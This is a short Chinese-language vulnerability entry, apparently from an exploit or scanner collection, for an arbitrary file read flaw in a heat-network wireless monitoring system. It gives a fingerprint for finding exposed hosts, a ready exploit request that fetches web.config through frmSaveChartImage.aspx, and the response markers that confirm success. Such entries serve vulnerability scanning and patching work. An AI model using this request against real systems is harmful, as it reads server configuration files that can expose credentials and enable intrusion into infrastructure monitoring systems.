# 热网无线监测系统frmSaveChartImage存在任意文件读取漏洞

热网无线监测系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Downloads/HDPrintInstall.rar"`
- **请求**：`GET /frmSaveChartImage.aspx?file=web.config HTTP/1.1`
- **响应特征**：200 <configuration>
或
<system.web.extensions>